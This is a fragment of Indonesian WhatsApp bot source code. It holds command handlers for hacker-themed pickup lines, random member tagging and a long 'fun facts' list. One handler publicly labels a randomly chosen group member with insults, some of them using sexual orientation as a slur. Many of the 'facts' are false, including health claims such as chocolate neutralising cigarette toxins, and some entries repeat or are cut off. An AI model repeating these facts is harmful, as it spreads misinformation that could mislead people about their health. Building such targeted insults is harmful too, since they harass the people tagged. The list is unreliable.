	"Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
	"berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
	"Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
	"Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
	"Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
	"Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
	"Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
	"Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
	"Aku deketin kamu cuma untuk redirect ke hati temenmu.",
	"Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
	"Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
	"kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
	"Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
	"Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
	"SQLI ( Structured Query Love Injection )",
	"aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
	"Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
	"kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
	"Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
	"hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
	"Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
	"Jangan men-dualboot-kan hatiku kepadamu.",
	"cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
	"KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
	"Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
	"cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"]
const hew = tol[Math.floor(Math.random() * tol.length)]
Al.sendMessage(m.chat, {text: `${hew}` }, {quoted: fkontak})
}
break
//========================
case 'idiot':
case 'gay':
case 'lesbi':
case 'bastard':
case 'stubble':
case 'dog':
case 'fuck':
case 'noob':
case 'great':
case 'horny':
case 'wibu':
case 'asshole':
case 'handsome':
case 'beautiful':
case 'cute':
case 'kind':
case 'ugly':
case 'pretty':
case 'lesbian':{
if (!m.isGroup) return m.reply('Fitur Khusis Group!')
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
Al.sendMessage(m.chat,
{ text: `Disini yang ${command} yaitu si @${org.split('@')[0]}`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${namabot}`,
"body": `${namaowner}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": global.mark,
"sourceUrl": global.sgc}}},
{ quoted: m})
}
break
//========================
case 'csukses':
case 'calonsukses':
case 'calonanaksukses':
case 'anaksukses':
case 'sukses':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let member = participants.map(u => u.id)
let sukses = member[Math.floor(Math.random() * member.length)]
let jawab = `Calon anak sukses disini yaitu @${sukses.split('@')[0]}`
let menst = [sukses]
Al.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
//========================
case 'jadian':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let member = participants.map(u => u.id)
let jadian = member[Math.floor(Math.random() * member.length)]
let jawab = `*JADIAN SESEORANG*\nCiee @${jadian.split('@')[0]} Jadian sama @${jadian.split('@')[0]} 🤭`
let menst = [jadian]
Al.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
//========================
case 'jodoh':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Tag orangnya!\n\n*Contoh :* ${prefix+command} @${jodohx.split('@')[0]}`)
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let member = participants.map(u => u.id)
let jodohx = member[Math.floor(Math.random() * member.length)]
let jawab = `*JODOH SESEORANG*\nJodoh ${mesej} yaitu si @${jodohx.split('@')[0]} 🤭`
let menst = [jodohx]
Al.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
//========================
case 'fakta':
case 'quotesfakta':
case 'qfakta': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const faktaa = ["Indonesia adalah Tempat ditemukannya ular terpanjang di dunia yaitu, Python Reticulates sepanjang 10 meter di Sulawesi",
"Suatu penyakit yang disebut “Exercise-Induced Anaphylaxis” harfiah menyebabkan orang menjadi ‘alergi’ untuk berolahraga",
"Pada Sept1909 malam hari, warga Jakarta beruntung menyaksikan Aurora Borealis di langit yg biasanya hanya di kutub ( Prof. Truls L Hansen)",
"Bromelain yang terkandung dalam Nanas bila dikonsumsi berlebihan bagi wanita hamil bisa memicu kontraksi dini bahkan keguguran",
"Secara resmi setiap tanggal 6 Oktober di Jepang merayakan Tom Cruise Day",
"Jembatan suramadu (surabaya-madura) adalah jembatan terpanjang di Asia Tenggara (5438 m)",
"Burung umumnya tidak berkicau apabila mereka hinggap di tanah (Hummingbirdworld)",
"Orang sherpa di Nepal menganjurkan orang memakan bawang putih utk mencegah dan mengobati rasa tidak nyaman yg disebabkan ketinggian gunung",
"Teka-teki silang terbesar yang pernah diterbitkan memiliki 2631 pertanyaan mendatar dan 2922 pertanyaan menurun",
"Rafflesia Arnoldii yang tumbuh di Sumatera adalah bunga terbesar di dunia. Ketika bunganya mekar, diameternya mencapai 1 meter",
"Tertawa dan bahagia meningkatkan imun, terutama produksi sel-sel pembunuh alamiah yang membantu melindungi tubuh dari penyakit",
"Orang yang membayangkan suara baru yang belum pernah didengar, atau menggabungkan sebuah melodi matanya akan bergerak ke kir",
"Kecoa kentut setiap 15 menit dan terus mengeluarkan gas metana (kentut) selama 18 jam setelah kematian",
"Menara Eiffel dibangun oleh Alexandre Eiffel, dan sebagian besar biayanya ditanggung oleh dia",
"Rata-rata orang di dunia jatuh cinta sebanyak 7 kali dulu sebelum ditakdirkan menikah",
"Mengoleskan jeruk nipis dapat mencerahkan bagian lutut / siku yang hitam",
"Ken Edwards seorang pria asal Inggris memegang rekor Guinness untuk makan 36 kecoa dalam 1 menit",
"Energi yang dihasilkan oleh angin ribut (topan) selama 10 menit lebih besar dibandingkan energi dari bom saat perang",
"Lagu kebangsaan Yunani mempunyai 158 bait",
"Kata “depp” dalam bahasa Jerman artinya “idiot”",
"Bobby Tufts (4 tahun) adalah Wali Kota termuda di dunia saat ini (Wali Kota Dorset, Minnesota, AS)",
"Menghisap rokok sambil makan cokelat dapat membunuh racun yang terdapat pada rokok tersebut. [penelitian kedokteran di Universitas Lampung]",
"Di zaman penjajahan Belanda, hukuman orang yg berzina adlh ditangkap dan dicorengkan arang pd hidungnya. Inilah asal usul “Hidung Belang”",
"Kebanyakan orang lebih percaya terhadap kemampuan kepemimpinan seseorang jika orang itu memiliki badan yang lebih tinggi. [inilah .com]",
"Dalam setiap inci persegi permukaan smartphone terdapat skitar 25.107 kuman, artinya smartphone lebih kotor dr kloset. [Laporan dr Proporta]",
"Kebiasaan sibuk memotret dan mengunggah foto makanan di sosial media, beresiko seseorang menjadi gendut. [Dr. Valerie Taylor]",
"Anak yang gemar berolahraga lebih cerdas dibandingkan yang tidak. [penelitian di Michigan State University]",
"Kelurahan Air Jamban adalah nama kelurahan di kecamatan Mandau, kabupaten Bengkalis, provinsi Riau, Indonesia",
"Kata “Poli” berarti Banyak dan “Tics” berarti Makhluk Pengisap Darah. Jadi kata Politics (politik) berarti Banyak Makhluk Pengisap Darah",
"Musik dapat membuat otak bahagia dan kebanyakan mendengarkan musik dapat membuat perut cepat lapar",
"Mendengarkan musik irama lambat saat tidur terbukti mampu meningkatkan kemampuan memori otak. [penelitian di Universitas Tubingen Jerman]",
"Pulau Giliyang di Sumenep, Jawa Timur disebut sbg pulau “Awet Muda” karena pulau ini memiliki kandungan oksigen terbaik di dunia. [tempo co]",
"Morology / Morologi adalah studi tentang percakapan konyol.",
"Hormon Cinta hanya bertahan 4 tahun, sisanya dorongan seks. [penelitian di University of Mexico]",
"Letusan gunung Tambora mengilhami penemuan sepeda, karena bnyk hewan transportasi menjadi mati akibat dr prubahan cuaca yg ekstrem saat itu",
"Tertawa sebanyak 100 kali setara dengan mendayung selama 10 menit. [Dr William Fry dari Stanford Medical School]",
"Studi menunjukkan penggemar musik heavy metal ternyata lebih bisa meredam emosi negatif dan lebih ekspresif. [Sciencedaily]",
"Orang yang terlalu sering begadang memiliki performa otak seperti 7 tahun lebih tua dari usia aslinya. [dailymail.",
"Di Italia, dalam aturannya minuman Cappuccino hanya boleh di minum sebelum waktu siang",
"Hormon Cinta hanya bertahan 4 tahun, sisanya dorongan seks. [penelitian di University of Mexico]",
"Letusan gunung Tambora mengilhami penemuan sepeda, karena bnyk hewan transportasi menjadi mati akibat dr prubahan cuaca yg ekstrem saat itu",
"Tertawa sebanyak 100 kali setara dengan mendayung selama 10 menit. [Dr William Fry dari Stanford Medical School]",
"Studi menunjukkan penggemar musik heavy metal ternyata lebih bisa meredam emosi negatif dan lebih ekspresif. [Sciencedaily]",
"Orang yang terlalu sering begadang memiliki performa otak seperti 7 tahun lebih tua dari usia aslinya. [dailymail]",
"Koin ¥ 1 (Yen Jepang) bisa mengapung di atas air",
"Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin",
"Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan kecemasan, bahkn dpt meningkatkan memori. [Dailymail]",
"Kata “Mouse” (tikus) berasal dari turunan Bahasa Sansekerta “Mus” yang berarti “pencuri”. 48. Berjalan kaki atau bersepeda ke sekolah mempertajam konsentrasi siswa di kelas dan tetap bertahan sekitar 4 jam kemudian. [Medical Daily]",
"Menurut riset pasar global Euromonitor International, pria Korea adalah pria yang paling suka bersolek dari pria lain di dunia",
"Rata-rata orang akan merasa 100 persen sehat / fit hanya 61 hari dalam setahun. [penelitian di Inggris]",
"Polydactyl Cat adalah jenis kucing yang memiliki jempol di kaki mereka",
"Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]",
"Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan",
"Wanita merasa diri mereka terlihat paling jelek dan terlihat lebih tua pada hari Rabu pukul 15.30.  [studi baru dari St Tropez] Expand",
"Orang yang rutin bermain video game ternyata memiliki penalaran yang baik dibanding kebanyakan orang (detikHealth)",
"Nama “Gorila” berasal dari kata Yunani “Gorillai” yang berarti “perempuan berbulu”",
"IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan",
"Selama abad ke-13, kata “nice” sebenarnya berarti “stupid”, “senseless” dan “foolish”",
"49% dari pemilik Smartphone adalah jomblo. (Survei, “2012 Online User Behavior and Engagement Study”)",
"Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)",
"Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor",
"Fobia matematika (mathematics anxiety) memicu respon yang sama di otak sbg rasa sakit fisik. Gejalanya yaitu melihat angka saja sudah nyeri",
"Karakter kartun Bugs Bunny diberi pangkat kehormatan sersan-mayor di Korps Marinir AS pada akhir Perang Dunia II. (wikipedia)",
"Menurut etiket internasional, sebuah jabat tangan yang tepat dan baik harus berlangsung selama sekitar 3 detik & dilepaskan setelah goyang",
"Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan",
"“Mwahahaha” dan “lolz” telah ditambahkan ke Kamus Inggris Oxford",
"Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya",
"Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut “Barbe á Papa” yang berarti “Jenggot Ayah”",
"Menurut penelitian, PR terlalu banyak sebenarnya dapat menyebabkan siswa menjadi stres, depresi & mendapat nilai lebih rendah",
"Hangry adalah penggabungan kata dari “Hungry” dan “Angry”, di pakai ketika anda sedang lapar dan marah",
"Kentut dari bakteri membuat keju swiss memiliki lubang-lubang",
"Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)",
"Mendengarkan musik benar-benar dapat mengurangi rasa sakit kronis hingga 20% dan membantu meringankan depresi hingga 25%. (sciencedaily)",
"Tanduk badak terbuat dari keratin",
"Jerapah memiliki lidah sepanjang 21 inchi",
"Sepeda pertama dibuat pada tahun 1817 dibuat tanpa pedal",
"Rechendorfer Yusuf adalah orang pertama yang berhasil menempatkan karet penghapus di atas sebuah pensil",
"Balon mainan yang pertama kali terbuat dari karet vulkansir",
"Satu ujung pensil dapat menulis 50.000 kata dalam bahasa Inggris",
"Terdapat hampir 900 jenis kelelawar di dunia",
"Tangan kanan orang hidup lebih lama dari tangan kiri",
"Banyak orang yang dibunuh oleh keledai",
"Seekor buaya tidak dapat mengeluarkan lidah",
"Semut tidak tidur",
"Beruang kutub bertangan kidal",
"Astronot tidak diperbolehkan untuk makan kacang-kacangan sebelum mereka pergi ke ruang angkasa karena buang angin/kentut dalam pakaian ruang angkasa mengakibatkan kerusakan",
"Dengan menaikkan kaki Anda perlahan dan berbaring ke belakang, Anda tidak dapat terperosok ke dalam pasir",
"Pemogokan cahaya di bumi sekitar 6.000 kali per menit",
"Lobster memiliki darah biru",
"Seorang pria mengatakan rata-rata 4.850 kata dalam 24 jam",
"Kuku ibu jari tumbuh lambat dan kuku jari tengah yang tercepat",
"Kecap sebelumnya dijual sebagai obat",
"Cokelat dapat membunuh anjing",
"Produk pertama yang memiliki barcode adalah Wrigley’s gum",
"Kanada dalam bahasa India berarti Desa Besar",
"Seseorang menghasilkan 100 pound sel darah merah dalam hidupnya",
"Pita karet terpanjang adalah di kulkas",
"Ada 293 cara untuk menukar dolar",
"“Dreamt” adalah satu-satunya kata yang berakhir dengan ‘mt’",
"Orang yang cerdas memiliki kadar seng dan tembaga di rambut mereka",
"69% orang Amerika menggunakan internet dan hanya 5,5% dari India",
"Plastik dibutuhkan 500 tahun untuk terurai",
"Amerika telah memiliki 30,30% bandara di dunia & India hanya 0,70%",
"Total wilayah permukaan bumi adalah 197 juta mil persegi",
"Cahaya matahari mencapai bumi membutuhkan waktu sekitar 8 jam 3 detik",
"Penduduk di dunia telah meningkat 3,1 miliar dalam 40 tahun terakhir",
"Sekitar 180 juta kartu Valentine tersebar per tahunnya",
"Orang yang berusia di atas 100 di AS meningkat dari 4.000 pada tahun 1960 menjadi 55.000 pada tahun 1995",
"Seekor kucing dapat berlari 20 km per jam",
"Seekor cheetah dapat berlari 76 km per jam",
"Katak yang terbesar di dunia adalah Goliath Frog",
"Tidak ada dua zebra yang belangnya serupa",
"Terdapat hampir 50 jenis kangguru",
"Joeys adalah nama yang diberikan kepada anak kanguru",
"Woodpecker dapat mematuk 20 kali dalam satu menit",
"Lidah seekor Chameleon adalah dua kali panjang tubuhnya sendiri",
"10% dari populasi dunia adalah tangan kiri",
"Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai “emas putih”",
"Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]",
"Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]",
"Disarankan supaya membeli sepatu pada sore hari. Sebab, setelah seharian berjalan, di sore hari kaki akan membesar 5-8 persen",
"Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]",
"Perbandingan jumlah rayap dan manusia di dunia adalah 10 :",
"Ayam yang sudah terpenggal lehernya masih mampu lari sepanjang lapangan bola sebelum benar-benar mati",
"Berdiri lama tanpa menekuk lutuk sama sekali akan membuat kita pingsan",
"Kuda Nil kentut lewat mulut",
"Pohon kelapa membunuh 150 orang tiap tahun, lebih banyak daripada hiu",
"Jika kita memelihara ikan mas dalam ruangan yang gelap, warnanya akan berubah putih",
"Tikus beranakpinak sangat cepat dan dalam waktu 18 bulan, dua tikus dapat memiliki lebih dari 1 juta keturunan",
"Kita bernafas kira-kira 23.000 kali setiap hari",
"Tahukah anda? Llanfairpwllgwyngyllgogerychwyrndrobwlll, adalah nama sebuah desa di Wales Utara, Inggris. Sulit dibaca bukan?",
"Ada sekitar 10ribu jenis apel di dunia Kutu rambut sebenarnya lebih suka hidup di kulit kepala yang bersih dari pada yang kotor",
"Umur dari capung adalah 24 jam",
"Pria kehilangan 40 helai rambut tiap hari. wanita 70 helai",
"Jika bersin terlalu keras dapat meretakkan tulang iga. JIka mencoba menahan bersin, bisa mengalami pecah pembuluh nadi di kepala dan leher trus mati . jika memaksa mata terbuka saat bersin, bola mata bisa meloncat keluar",
"Kalajengking bisa dibunuh dengan menyiramnya dengan cuka,mereka akan murka dan menyengat dirinya sendir",
"Kentut sapi termasuk penyebab utama global warming",
"Gerakan Bruce Lee sangat cepat sehingga mereka harus melambatkan film agar kita bisa melihat semua gerakannya",
"Siput bisa tidur selama 3 tahun",
"Jika kita berdiri di dasar sumur, kita bisa melihat bintang walaupun di siang hari",
"Tehnik mengaduk terbaik bukan dengan gerakan memutar, tapi dengan gerakan huruf W",
"Tiap tahun, bulan menjauh 3.82 cm dari bumi",
"Riset membuktikan, memakan pisang bisa menambah daya ingat",
"Orang yang alergi bahan latex, biasanya alergi kiwi juga",
"Ilmu tentang perkembangan apel disebut Pomology",
"Kita bisa mematangkan Mangga dengan cepat dengan cara meEnter ke dalam paperbag bersama dengan pisang matang",
"Antioksidans pada apel lebih besar 5x dari pisang",
"Hanya 1 dari 5 orang australia makan apel tiap hari",
"Kiwi memiliki nama lain Chinese Gooseberry",
"Mangga masih 1 family dengan tanaman Poison Ivy",
"Pelaut inggris mengonsumsi air jeruk nipis untuk menghindari mabuk laut",
"Pelaut inggris disebut juga Limeys karena suka minum air jeruk nipis",
"Nanas mengandung Bromelain yang berguna mencegah bir dingin berawan",
"Kutu rambut sebenarnya lebih suka hidup di kulit kepala yang bersih dari pada yang kotorUmur dari capung adalah 24 jam",
"1 pohon apel rata2 bisa menghasilkan 500buah apel",
"25% kandungan dalam apel adalah Udara. makanya apel bisa mengapung",
"Lebih dari 60juta Ton apel dihasilkan di dunia per periode tertentu",
"Kiwi ditetapkan sebagai buah kebangsaan di Cina",
"Pear akan berubah menjadi hitam sekali jika disimpan pada lingkungan yang kurang oksigen",
"Markisa pertama kali ditemukan di Brazil",
"Riset membuktikan bahwa makan apel bisa mengurangi risiko kena kanker",
"Biji apel merupakan racun ringan namun tidak berbahaya bagi manusia",
"Jeruk adalah buah yang paling umum di dunia",
"Beberapa negara di dunia melatih bangsa monyet untuk memetik kelapa",
"Ada lebih dari 400jenis kiwi di Cina",
"Bahasa gaul di australia “She’s Apple” bukan berarti “Dia (wanita) manis” tetapi berarti “Semuanya baik2 saja”",
"Nanas yang belum matang adalah racun",
"Kiwi memiliki nama asli Yang Tao (Sunny Peach)",
"Makan pisang ketika makan nasi dapat membantu ibu hamil terhindar dari Morning Sickness",
"Plum jepang sebenarnya berasal dari Cina",
"Plum bisa tumbuh di semua benua kecuali antartika",
"Memerlukan tenaga 50lembar daun untuk menghasilkan 1buah apel dalam 1pohon",
"Makan plum membantu meningkatkan penyerapan zat besi dalam tubuh",
"Anggur dapat meledak jika diEnter ke dalam microwave",
"Pisang mengandung vitamin B6 yang bisa mengontrol kadar gula dalam darah, dan membangkitkan mood",
"1nanas bukan 1buah, tetapi terdiri atas lebih dari 200anak buah (fruitlets)",
"Jeruk nipis tidak mengandung segala jenis lemak, natrium, dan kolestrol",
"Menanam semangka dalam kotak akan menghasilkan semangka kotak",
"Dilihat dari beratnya, semangka adalah buah yang paling diminati di USA",
"Pohon kelapa entah kenapa disebut “Tree of Life”",
"Bunga pohon markisa adalah Bunga kebangsaan negara Paraguay",
"Semangka adalah sepupunya Terong, Labu, dan Squash",
"Menanam 1biji buah jeruk bisa menghasilkan lebih dari 1 pohon",
"Bagian dalam kulit pisang bisa untuk menyemir sepatu kulit",
"Bagian dalam kulit pisang juga bisa digunakan untuk menghilangkan gatal bekas gigitan nyamuk dengan cara menggosokkannya",
"Di Kerala, India selatan, Bunga kelapa digunakan untuk upacara Pernikahan",
"Kulit Plum dipercaya memiliki efek Laxative",
"Pisang kaya akan vitamin B-Complex yang bisa menenangkan sistem saraf",
"Tidak ada yang se-rima dengan “orange” (jeruk)",
"Salah satu spesies markisa yang buahnya berwarna ungu bisa melakukan fertilisasi sendiri",
"Pisang bisa meningkatkan kadar Serotonin yang bisa melawan depresi",
"Semakin besar “Navel” pada Jeruk Navel, semakin manis buahnya",
"Markisa yang berkerut adalah markisa yang paling manis",
"Radiasi dari 1 batang rokok sama dgn radiasi 2000x X-ray",
"Sepatu boot awalnya dikhususkan untuk berperang",
"Sebelum Masehi bahasa inggrisnya adalah B.C (Before Christ). Setelah Masehi adalah A.D (Anno Domini)",
"Ikan hiu kehilangan gigi lebih dari 6000buah setiap tahun, dan gigi barunya tumbuh dalam waktu 24 jam",
"Julius Caesar tewas dengan 23 tikaman",
"Nama mobil Nissan berasal dari bahasa jepang Ni : 2 dan San : 3. Nissan : 23",
"Jerapah dan tikus bisa bertahan hidup lebih lama tanpa air dari pada unta",
"Perut memproduksi lapisan lendir setiap dua minggu agar perut tidak mencerna organnya sendiri",
"98% dari perkosaan dan pembunuhan dilakukan oleh keluarga dekat atau teman korban",
"Semut dapat mengangkat beban 50 kali tubuhnya",
"Deklarasi Kemerdekaan Amerika ditulis diatas kertas marijuana",
"Titik diatas huruf i disebut ‘title’",
"Sebutir kismis yang dijatuhkan kedalam gelas berisi sampanye segar akan bergerak naik turun dalam gelas",
"Benjamin Franklin anak bungsu dari orangtua bungsu keturunan ke 5 dalam keluarga bungsu",
"Triskaidekaphobia adalah ketakutan pada 13. Paraskevidekatriaph obia adalah ketekukan pada hari jumat tanggal 13 (bisa terjadi antara 1-3 kali setahun). di Italia, 17 adalah angka sial di Jepang angka sial adalah 4",
"Lidah jerapah panjangnya sekitar 50 cm",
"Mulut menghasilkan 1 liter ludah setiap hari",
"Kita bernafas kira-kira 23.000 kali setiap hari",
"Kata ZIP (kode pos) adalah kepanjangan dari ‘Zoning Improvement Plan’",
"Coca-Cola mengandung Coca (yang merupakan zat aktif pada kokain) dari tahun 1885 sampai 1903",
"Rata-rata kita bicara 5000 kata tiap hari (walaupun 80% nya kita bicara pada diri sendiri)",
"Seandainya kuota air dalam tubuh kita berkurang 1%, kita langsung merasa haus",
"4 simbol raja pada kartu remi melambangkan 4 raja yang etrkenal di jaman masing-masing: Sekop = David/Raja Daud ; Keriting = Alexander the Great/Iskandar Agung ; Hati = Charlemagne/ Raja Prancis ; Wajik =Julius Caesar",
"Seumur hidup kita meminum air sebanyak kurang lebih 75.000 liter",
"Setiap orang, termasuk kembar identik, sidik jari dan tekstur lidahnya tidak ada yang sama",
"Titik merah pada 7-Up logo berasal dari penemunya yang bermata merah. Dia seorang albino",
"Pria kehilangan 40 helai rambut tiap hari. wanita 70 helai",
"Tanda ’save’ pada Microsoft Office programs menunjukan gambar floppy disk dengan shutter terbalik",
"Albert Einstein dan Charles Darwin,keduanya menikah dengan sepupu pertama mereka (Elsa Löwenthal dan Emma Wedgewood)",
"Unta punya 3 kelopak mata",
"Sehelai rambut di kepala kita mempunyai masa tumbuh 2 sampai 6 tahun sebelum diganti dengan rambut baru",
"Seseorang masih akan sadar selama 8 detik setelah dipenggal",
"Otot yang bekerja paling cepat ditubuh kita adalah otot dikelopak mata yang membuat kita berkedip. kita bisa berkedip 5kali dalam sedetik",
"Coklat dapat membunuh anjing,karena langsung mempengaruhi jantung dan susunan syarafnya",
"Tanpa dicampur ludah di dalam mulut, kita tidak akan merasakan rasa makanan",
"Kuku jari tangan tumbuh 4kali lebih cepat daripada kuku kaki",
"13% orang di dunia adalah kidal",
"Hampir semua lipstik mengandung sisik ikan",
"Bayi yang baru lahir berat kepalanya 1/4 dari berat tubuhnya",
"Kita sebenarnya melihat dengan otak. mata hanya berupa kamera yang mengirim data ke otak. 1/4 bagian dari otak digunakan untuk mengatur kerja mata",
"Kalajengking bisa dibunuh dengan menyiramnya dengan cuka,mereka akan murka dan menyengat dirinya sendiri",
"Tahun 1830an saus tomat biasa dijual sebagai obat",
"Tiga monyet bijak punya nama: Mizaru (See no evil), Mikazaru (Hear no evil), and Mazaru (Speak no evil)",
"India mempunyai Undang-undang hak untuk sapi",
"Jika bersin terlalu keras dapat meretakkan tulang iga. JIka mencoba menahan bersin, bisa mengalami pecah pembuluh nadi di kepala dan leher trus mati . jika memaksa mata terbuka saat bersin, bola mata bisa meloncat keluar",
"Nama negara Filipina berasal dari nama Raja Phillip",
"Saudi Arabia berasala dari nama Raja Saud",
"Anak-anak mempunyai 20 gigi awal. Orang dewasa punya 32",
"Karena langkanya logam, piala Oscars yang dibagikan pada perang dunia ke II terbuat dari kayu",
"Setiap Siklus 11 tahun, kutub magnet pada matahari bertukar tempat. Siklus ini dinamakan “Solarmax”",
"Ada 318,979,564, 000 kemungkinan kombinasi pembukaan pertama pada catur",
"Ada lebih dari 300 bakteri pembentuk karang gigi",
"Macan adalah anggota terbesar dalam keluarga kucing",
"Nomer “172? dapat ditemukan pada uang kertas 5 dollar amerika, pada gambar semak-semak dibawah Lincoln Memorial",
"Pohon kelapa membunuh 150 orang tiap tahun. Lebih banyak daripada hiu",
"Pada poster film ‘Pretty Woman’ Julia Robets terlalu pendek untuk bisa sejajar dengan Richard Gere. Maka digunakan model Shelley Michelle sebagai tubuh Julia",
"Daerah kutub kehilangan matahari selama 186 hari dalam setahun",
"Kode Telephone Internasional untuk Antartica adalah 672",
"Bom pertama sekutu dijatuhkan di Berlin pada perang dunia ke II. Membunuh satu-satunya gajah di Kebun Binatang Berlin",
"Rata-rata hujan jatuh dengan kecepatan 7 mil per jam",
"Butuh 10 tahun bagi Leonardo Da Vinci untuk melukis Mona Lisa. Lukisan itu tidak ditandai dan di beri tanggal. Leonardo dan Mona mempunya susunan tulang yang persis sama dan menurut sinar X, ada 3 versi lukisan dibawah lukisan itu",
"Nama dari kembar gemini adalah Castor dan Pullox",
"Gerakan Bruce Lee sangat cepat sehingga mereka harus melambatkan filam agar kita bisa melihat semua gerakannya",
"Satu kilo dari berat badan kita mengandung 7000 kalori",
"Darah sama kental dengan air laut",
"Air laut di samudra Atlantik lebih asin dari pada di samudra Pasifik",
"Topeng tokoh Michael Myers di film horor ‘Helloween’ sebenernya topeng tokoh Captain Kirk (Star Trek) yang di cat putih, karena kurang dana",
"Nama asli butterfly (kupu-kupu) adalah flutterby",
"Bayi lahir setiap 7 detik",
"Satu dari 14 wanita Amerika berambut pirang asli. Prianya hanya satu dari 17",
"The Olympic adalah saudara dari kapal Titanic, dan melayani dengan selamat selama 25 tahun",
"Saat Titanic karam, 2228 orang ada di dalamnya. Hanya 706 yang selamat",
"Di Amerika, seseorang didiagnosa menderita AIDS tiap 10 menit. Di Afrika, seseorang meninggal karena AIDS tipa 10 menit",
"Sampai usia 6 bulan, bayi bisa menelan dan bernapas secara bersamaan. Orang dewasa tidak bisa",
"Alasan kenapa diiklan jam kebanyakan jarum menunjuk pukul 10.10, karena jam seperti sedang tersenyum",
"Tiap tahun bulan menjauh 3.82 cm dari bumi",
"Saat kita bertahan hidup dan tidak ada bahan makanan, sabuk kulit dan sepatu keds adalah makanan terbaik untuk dimakan karena mengandung cukup gizi untuk hidup sementara",
"Dalam satu tetes air mengandung 50 juta bakteri",
"Dengan menaikan kaki pelan2 dan berbaring tenang dengan punggung lurus, kita tidak akan tenggelam di pasir hisap",
"Satu dari 10 orang hidup di suatu pulau",
"Memakan seledri membuang kalori lebih banyak dari pada kalori yang terkandung dalam seledri itu sendiri",
"Lobster dapat hidup selama 100 tahun",
"Permen karet tidak dijual di Disney Land",
"Mangunyah permen karet saat mengupas bawang mencegah kita menangis",
"Rahang kucing gak bisa bergerak kekiri dan kanan",
"Nama Artic (kutub utara) berarti beruang dalam bahasa Yunani (Arktos), dan memang beruang kutub hanya ada di kutub utara",
"Jika kira berdiri di dasar sumur, kita bisa melihat bintang walaupun di siang hari",
"Suara yang kita dengar dari dalam kerang bukan suara ombak laut, tapi suara aliran darah dalam kepala kita",
"Orang kebanyak yang menderita ketakutan pada ruang terbuka (kenophobia) daripada ketakukan pada ruang tertutup (claustrophobia) ",
"Tehnik mengaduk terbaik bukan dengan gerakan memutar, tapi dengan gerakan huruf W",
"Adegan band yang terus bermain musik saat Titanic tenggelam adalah kisah nyata",
